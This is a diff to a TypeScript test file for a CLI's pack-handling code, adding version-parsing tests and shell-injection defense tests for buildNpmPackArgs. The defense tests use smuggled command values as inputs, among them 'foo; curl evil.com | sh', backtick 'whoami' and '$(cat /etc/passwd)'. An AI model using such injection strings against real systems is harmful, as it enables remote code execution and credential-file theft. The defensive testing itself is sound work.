@@ -12,6 +12,7 @@ import { join } from "node:path";
 import {
   loadPackFromDir,
   extractPackCanonicalName,
+  buildNpmPackArgs,
   type PackContents,
 } from "../src/commands/skill.js";
 
@@ -243,6 +244,97 @@ describe("extractPackCanonicalName", () => {
 
   test("scope/name (no version) → scope-name", () => {
     expect(extractPackCanonicalName("@harperfast/skills")).toBe("harperfast-skills");
+  });
+
+  // Prerelease suffixes (Kern flag)
+  test("prerelease: @scope/name@2.0.0-beta.1 → scope-name", () => {
+    expect(extractPackCanonicalName("@harperfast/skills@2.0.0-beta.1")).toBe(
+      "harperfast-skills",
+    );
+  });
+
+  test("prerelease: @scope/name@1.0.0-rc.2 → scope-name", () => {
+    expect(extractPackCanonicalName("@tpsdev-ai/rules@1.0.0-rc.2")).toBe("tpsdev-ai-rules");
+  });
+
+  test("prerelease: name@3.0.0-alpha.5.build.42 → name", () => {
+    expect(extractPackCanonicalName("pack@3.0.0-alpha.5.build.42")).toBe("pack");
+  });
+
+  test("prerelease: name with prerelease but no scope", () => {
+    expect(extractPackCanonicalName("simple@2.5.1-beta")).toBe("simple");
+  });
+
+  test("name with no version at all", () => {
+    expect(extractPackCanonicalName("plain-pack")).toBe("plain-pack");
+  });
+});
+
+// ─── buildNpmPackArgs — shell injection defense ──────────────────────────────
+
+describe("buildNpmPackArgs — shell safety", () => {
+  test("produces array args (never a shell string)", () => {
+    const args = buildNpmPackArgs("pkg@1.0.0", "/tmp/dir");
+    // Must be an array for spawnSync, not a shell-string for execSync
+    expect(Array.isArray(args)).toBe(true);
+    expect(args[0]).toBe("pack");
+    expect(args[1]).toBe("pkg@1.0.0");
+    expect(args[2]).toBe("--pack-destination");
+    expect(args[3]).toBe("/tmp/dir");
+  });
+
+  test("shell metacharacters stay as literal args", () => {
+    // 'foo; curl evil.com | sh' should be a single literal arg, not split
+    const args = buildNpmPackArgs("foo; curl evil.com | sh", "/tmp/dir");
+    expect(args[1]).toBe("foo; curl evil.com | sh");
+    // No extra args were spawned (; | would create multiple shell commands)
+    expect(args.length).toBe(4);
+  });
+
+  test("backtick injection stays literal", () => {
+    const args = buildNpmPackArgs("pkg`whoami`", "/tmp/dir");
+    expect(args[1]).toBe("pkg`whoami`");
+    expect(args.length).toBe(4);
+  });
+
+  test("dollar-substitution stays literal", () => {
+    const args = buildNpmPackArgs("pkg$(cat /etc/passwd)", "/tmp/dir");
+    expect(args[1]).toBe("pkg$(cat /etc/passwd)");
+    expect(args.length).toBe(4);
+  });
+
+  test("includes --registry when provided", () => {
+    const args = buildNpmPackArgs("pkg", "/tmp/dir", "https://registry.example.com");
+    expect(args).toEqual([
+      "pack",
+      "pkg",
+      "--pack-destination",
+      "/tmp/dir",
+      "--registry",
+      "https://registry.example.com",
+    ]);
+  });
+
+  test("registry URL with query params stays literal", () => {
+    const args = buildNpmPackArgs(
+      "pkg",
+      "/tmp/dir",
+      "https://reg.example.com?token=x&cmd=evil;ls",
+    );
+    expect(args[5]).toBe("https://reg.example.com?token=x&cmd=evil;ls");
+    expect(args.length).toBe(6);
+  });
+
+  test("spawnSync proof: echo with semicolons prints literally, no command injection", () => {
+    // Prove spawnSync with array args prevents shell expansion.
+    // If this were a shell string, 'echo hello; ls /' would run ls.
+    const { spawnSync } = require("node:child_process");
+    const r = spawnSync("echo", ["hello; ls /"]);
+    const out = r.stdout.toString().trim();
+    // The output should be literally "hello; ls /" — not a directory listing
+    expect(out).toBe("hello; ls /");
+    // ls was never invoked; only one line of output
+    expect(out.split("\n").length).toBe(1);
   });
 });
 
